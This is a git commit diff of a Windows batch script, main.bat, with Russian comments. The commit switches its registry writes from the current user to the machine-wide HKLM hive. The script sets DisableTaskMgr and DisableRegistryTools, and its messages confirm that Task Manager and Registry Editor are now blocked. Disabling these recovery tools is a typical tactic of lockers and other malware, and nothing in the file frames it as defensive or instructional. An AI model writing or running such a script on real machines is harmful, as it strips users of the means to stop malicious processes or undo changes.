84593fda5c07808ddc1d3c58e3d2eda66e91720c
bibroidinka <115043830+bibroidinka@users.noreply.github.com>
2025-09-27 19:12:07 +0200

    Update main.bat

--- main.bat
+++ main.bat
@@ -1,14 +1,14 @@
 @ECHO OFF
 
 REM 
-REG QUERY "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" >nul 2>&1
+REG QUERY "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" >nul 2>&1
 IF %ERRORLEVEL% NEQ 0 (
     ECHO Создаем ветку Policies\System
-    REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /f
+    REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /f
 )
 
 REM 
-REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
+REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
 
 IF %ERRORLEVEL%==0 (
     ECHO Диспетчер задач успешно заблокирован.
@@ -17,14 +17,14 @@ IF %ERRORLEVEL%==0 (
 )
 
 REM Проверяем, существует ли ветка Policies\System
-REG QUERY "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" >nul 2>&1
+REG QUERY "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" >nul 2>&1
 IF %ERRORLEVEL% NEQ 0 (
     ECHO Создаем ветку Policies\System
-    REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /f
+    REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /f
 )
 
 REM Устанавливаем параметр DisableRegistryTools
-REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
+REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
 
 IF %ERRORLEVEL%==0 (
     ECHO Редактор реестра успешно отключен.
